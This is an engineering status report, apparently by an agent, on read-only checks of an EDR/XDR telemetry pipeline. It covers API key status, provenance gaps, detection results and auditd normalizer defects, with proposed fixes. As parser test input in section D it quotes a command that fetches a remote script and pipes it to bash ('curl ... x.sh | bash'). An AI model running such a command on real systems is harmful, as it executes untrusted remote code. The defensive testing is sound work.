# STEP 1 — READ-ONLY REAL-LOOP PROOF · OWNER ANSWER (A–F)

Companion to `REAL_SECURITY_LOOP_STEP1_READONLY_PROOF.md` (the generated
per-event tables). Produced by:

- `scripts/p0_real_loop_readonly_proof.py` — walks N genuine live events
- `scripts/p0_auditd_defect_confirmation_readonly.py` — pure-function probe of
  the real auditd parser/normalizer
- `scripts/prod_readonly_credential_recon.py` — production GETs only

**No database write. No pipeline change. No fabricated timestamp. No minting.**

---

## 0 · SECURITY FIRST — status of the exposed credential

Established from the production **hash-chained** audit log (`prev_sig`/`sig`
per entry) and confirmed by direct object reads:

| Key | Name | Created | State | Ever used |
|---|---|---|---|---|
| `key_39cd17d816d248498d88` | `nivx-prod-1` | 2026-09-10 11:46:10Z | **REVOKED 12:47:47Z · `enabled=False`** | `last_used_at = None` |
| `key_dd92dd232f434bbba88b` | `nivx-prod-2` | 2026-09-10 13:01:36Z | **ACTIVE · `enabled=True`** | `last_used_at = None` |

- The exposed key is **already dead** — `API_KEY_REVOKED` is in the audit chain
  and the object reads back `enabled=False`. **No action required, and I minted
  nothing.**
- A **second key is live and has never been used.** It was created after the
  exposure. It is an unused live ingest credential with
  `collectors.enroll` + `collectors.read` on production. **Owner decision
  required** — recommend revoking it and minting fresh at onboarding time, so
  exactly one credential exists and its birth is tied to the onboarding event.
- Neither key has ever authenticated once, which independently corroborates
  that **no telemetry has ever reached production.**

### Production collector state — two collectors, same name, two tenants

| Collector | Tenant | State | reason | rx/parsed/norm |
|---|---|---|---|---|
| `col_c7147fd01df2438cbe08` | `default` | **STARTING** | `start requested` | 0/0/0 |
| `col_a3e09eddb0544a31882e` | `nivx-prod-1` | **DISABLED** | `stop requested` | 0/0/0 |

- The `default` one is the pre-patch artefact created before the tenant-context
  fix reached the SPA. It is a **stray** and should be deleted.
- `state_reason = "start requested"` proves **production is still running the
  pre-fix `start_collector()`** — so **D6 is resolved: the Start fix is NOT
  deployed.** It remains off the critical path (ingest writes state directly).
- `/api/incidents` returns **0** for both tenants. Production genuinely holds
  no incidents, exactly as the no-seed-data policy requires.

### A correction I owe you

My first recon run reported "0 api keys, 0 collectors" in both tenants. That
was **my bug**, not production reality: the API nests lists under
`data.api_keys` / `data.collectors` and my parser only read the top level, so
it silently returned an empty list. Fixed in the script, with a comment so it
cannot regress. **A read-only probe that silently returns zero is exactly the
kind of false negative this whole exercise exists to catch.**

---

## A · What is PROVEN

Ten genuine events produced by the live NivXForge sensor on this real host,
each walked end to end from stored evidence only:

| Gate | Verdict | Count |
|---|---|---|
| Real telemetry | **PASS** | 10/10 |
| Raw persistence | **PASS** | 10/10 |
| Parsing | **PASS** | 10/10 |
| Normalization | **PASS** | 10/10 |
| Canonical evidence | **PASS** | 10/10 |
| Provenance | **FAIL** | 0/10 |
| Detection | **PASS** | 10/10 |
| Verdict traceability | **PASS** | 10/10 |
| Tenant attribution | **PASS** | 10/10 |
| End-to-end traceability | **PASS** | 10/10 |

Specifically proven:

1. **The telemetry is genuinely real.** Every raw row is
   `trust_state=AUTHENTICATED` bound to a real credential
   (`cred_00b4f731548443fd`) and session, with `payload_sha256` and a
   `dedup_key`. Unauthorised attempts are recorded separately in
   `edr_rejected_telemetry` (1,045 rows) marked
   `evidence_eligibility: NEVER_EVIDENCE`.
2. **A real detection fired on real activity.** Two PROCESS events —
   `/bin/bash /tmp/tmpl9qzxlsq.sh` and `/bin/bash /tmp/tmpw937co58.sh`, parent
   `python3.11` — matched **`EDR-LNX-002` "Execution from a world-writable
   directory"**, verdict **SUSPICIOUS**, and both promoted into the **same**
   incident `inc_1a9f4bdd241442d2b6ac` / `INC000000638`, stamped
   `provenance: REAL_SENSOR_DERIVED`. Two events, one incident — grouping works.
3. **Detection is deterministic and no-match is a first-class answer.** Eight
   NETWORK events evaluated to `DETECTION_EVALUATED_NO_MATCH` /
   `INCONCLUSIVE`. Nothing was escalated for being merely unusual.
4. **End-to-end traceability holds in both directions.** `raw_id` →
   derivation → canonical id, and canonical → raw via
   `provenance.trace_id`, 10/10.
5. **Tenant attribution is intact.** raw tenant == canonical tenant, 10/10.
6. **The sensor declares its own blind spots.** Each event carries
   `not_observed` (e.g. `owning_process` on NETWORK, `exit_time`/`signer`/
   `integrity` on PROCESS). Absence of evidence is never silently rendered as
   evidence of absence.
7. **The one latency that can be honestly measured:**
   `sensor_observed → nivx_received`, n=10, min 40.3 ms, median 251.2 ms,
   max 1697.9 ms. Sample far too small for p95/p99 and none is claimed. The
   spread reflects the sensor's ~15 s batch cycle, not processing cost.

---

## B · What is NOT proven

- **Complete provenance.** 0/10 events carry the required stamp set.
- **Any real timing profile.** Only one stage boundary is genuinely measurable;
  everything else rests on a proxy.
- **Cross-domain XDR correlation.** Every event is endpoint-domain. NETWORK
  rows come from the *same* endpoint sensor, so they are **not** an independent
  telemetry domain. **No cross-domain claim is supportable.**
- **The auditd path.** One synthetic-host acceptance event, 2026-09-10, and it
  exposed real defects (D2/D3/D4 below).
- **Response and verification on a real target.** Every real isolate attempt
  ends `CAPABILITY_UNAVAILABLE` with `verification: null` — honest, but nothing
  has ever been verifiably contained.
- **Anything at all in production.** Zero events, zero incidents, both keys
  never used.

---

## C · Exact evidence for D1

Present on **every** event: `sensor_observed_at` (payload `observed_at`),
`nivx_received_at` (`edr_raw_events.ingest_time`).

Absent on **every** event: `collector_received_at`, `parsed_at`,
`normalized_at`, `rule_evaluated_at`, `verdict_at`.

**My Step 0 audit was wrong about one stamp, and the read-only walk is what
caught it:**

> `activity_occurred_at` **DOES exist** for PROCESS activity. The sensor reads
> `start_time` from `/proc` and it is carried into canonical evidence as
> `event_time` — verified byte-identical on both PROCESS rows
> (`13:58:26.840` and `13:57:50.530`). It is genuinely absent on NETWORK rows,
> and the sensor says so via `not_observed`.
>
> Had I patched D1 before looking, I would have added a redundant
> `activity_occurred_at` alongside an existing correct value. Your sequencing
> call was right.

What the four missing stamps would otherwise become:

| Stamp | Only real evidence available today |
|---|---|
| `parsed_at` | derivation `derived_at` (**one** write covering parse AND normalize) |
| `normalized_at` | the **same** `derived_at` — indistinguishable |
| `rule_evaluated_at` | detection derivation `derived_at` |
| `verdict_at` | the **same** detection `derived_at` |
| `collector_received_at` | **nothing.** On this path the sensor *is* the collector; there is no second hop to stamp |

This is precisely the trap you warned about: four schema fields could be
"filled" from two real writes, producing a complete-looking provenance record
that measures nothing. Proxy-derived numbers are marked `*` in the generated
report and must never be presented as stage latencies.

### New findings from the walk (not in the Step 0 audit)

- **D9 · `event_time` silently conflates two different things.** On all eight
  NETWORK rows `canonical.event_time` equals `sensor_observed_at`, not an
  activity time. A rule or timeline consumer cannot tell "when it happened"
  from "when we noticed". The sensor is honest in `not_observed`; canonical
  evidence loses that distinction.
- **D8 · Match detail is not persisted.** The derivation stores only
  `rule_id`, engine id and verdict label. **Which field matched, and on what
  observed value, is not recoverable from storage** — the values in §6 of the
  generated report were read back from canonical evidence at report time.
  Step 5 requires matched fields + observed values, so this must be fixed
  before detection acceptance.
- **D7 · Two canonical identities per activity.** Bridge id
  `cev_<raw>_<gen>` in `v2_shadow_observations` vs core id `cev_raw_<raw>_pl`
  in `xdr_canonical_evidence`. Both derive deterministically from the same
  immutable `raw_id`, so this is naming/indexing, **not** evidence
  duplication — but "the" canonical id for an activity is ambiguous.

---

## D · Are D2/D3/D4 confirmed?

**Yes — all three, by running the real production parser and normalizer as pure
functions on the verbatim auditd line already stored in canonical evidence.**

Input: `type=EXECVE msg=audit(1757452888.555:9002): argc=3 a0="/bin/bash"
a1="-c" a2="curl -s http://198.51.100.9/x.sh | bash"`, envelope
`source: "acceptance-host"`.

- **D2 CONFIRMED.** `host = {hostname: "", host_id: ""}` although the envelope
  carried `source="acceptance-host"`. `identity.username = "uid:"`,
  `is_privileged = False`.
- **D3 CONFIRMED.** `record_type=EXECVE` → `event_type="auditd_syscall"`,
  expected `process_execution`. `pid`/`ppid` both `None`.
- **D4 CONFIRMED, and worse than described.** The three records auditd
  genuinely emits for ONE execution under shared audit id
  `1757452888.555:9002` produce **3 separate canonical events that contradict
  each other**:

| Record | event_type | user | privileged | pid/ppid | command_line |
|---|---|---|---|---|---|
| SYSCALL | `process_execution` | `uid:1000` | **True** | 5678/1234 | `bash` |
| EXECVE | `auditd_syscall` | `uid:` | **False** | None/None | `/bin/bash -c curl -s http://198.51.100.9/x.sh \| bash` |
| PROCTITLE | `auditd_syscall` | `uid:` | **False** | None/None | `/bin/bash -c` |

This is a **correctness hazard, not cosmetics**: a rule keying on
`command_line` sees the EXECVE row, which claims the actor is *not* privileged;
a rule keying on privilege sees the SYSCALL row, which has no real command
line. **The same real execution can evade a rule that would have matched the
stitched truth, and it inflates one execution into three "events".**

- **D10 · NEW.** The auditd normalizer mints `event_id = uuid4()`, so replaying
  the identical line produces a **different** canonical id every time. The
  sensor path derives its id deterministically from the immutable `raw_id`.
  auditd therefore has **no stable canonical identity** — replay and
  idempotency reasoning break.

---

## E · Minimum fixes required

**Before claiming complete provenance (D1) — endpoint path**

1. Stamp `parsed_at` and `normalized_at` **separately at the two real
   boundaries** in `edr_plane/canonical_bridge.bridge()` — after `parse()`
   returns and after normalization completes. Do **not** fill both from one
   `derived_at`.
2. Stamp `rule_evaluated_at` and `verdict_at` **separately** in
   `xdr_pipeline.process_event_through_pipeline()` at detection completion and
   verdict computation.
3. `collector_received_at`: **report as structurally not-applicable** on the
   sensor path (sensor == collector), and stamp it for real on the XDR-ingest
   path at `xdr_ingest` arrival. Do not synthesise it.
4. Keep `activity_occurred_at` sourced from real observation only, and record
   it as genuinely unavailable where the sensor says `not_observed`.
5. **D9:** separate "when it happened" from "when we saw it" in canonical
   evidence rather than overloading `event_time`.

**Before detection acceptance (Step 5)**

6. **D8:** persist the match record — `rule_id`, rule version, matched field
   paths, observed values, `evidence_refs`.

**Before the auditd path is production-accepted**

7. **D2:** resolve host identity from the envelope (`source` / `node`) and
   user identity from the SYSCALL record.
8. **D3:** classify `EXECVE` as `process_execution`.
9. **D4:** stitch SYSCALL + EXECVE + PROCTITLE on the shared
   `audit(epoch:serial)` into ONE canonical execution before normalization.
10. **D10:** derive the auditd canonical `event_id` deterministically from
    tenant + collector + audit id, not `uuid4()`.

**Lower priority, record and schedule**

11. **D7:** pick one canonical id per activity, or document the two-id model
    explicitly.
12. **D5:** give the XDR-ingest canonical evidence a reference to its
    `xdr_canonical_events` raw row.
13. **D6:** the collector Start fix is not deployed; it is off the critical
    path. Deploy with the next genuine backend change, not on its own.

Fixes 7–10 are all inside the auditd DSM. **Fix 9 (stitching) must come
first** — 7 and 8 partly dissolve once the records are stitched, so doing them
in the wrong order means writing code twice.

---

## F · What should be done next

Recommended order, one step at a time, each stopping for review:

1. **Owner decision on `key_dd92dd232f434bbba88b`** (live, never used) and on
   deleting the stray `default` collector `col_c7147fd01df2438cbe08`. No
   engineering needed.
2. **D1 minimum patch, endpoint path only** (fixes 1–4), plus D9. Then re-run
   `p0_real_loop_readonly_proof.py` unchanged: the provenance gate must move
   FAIL → PASS on real events, with no proxy columns left.
3. **D8** so detection acceptance can cite matched fields and observed values.
4. **auditd D4 → D3 → D2 → D10**, in that order, with regression against both
   the existing auditd corpus and the sensor corpus.
5. Only then production auditd onboarding, gated on a real Linux host with
   auditd installed.

**Not being touched:** UI/UX, Cisco visual parity, reporting, graphs, Attack
Library, unrelated refactors. No production-readiness claim is made.

---

## STOP

Awaiting owner approval before changing D1–D10.
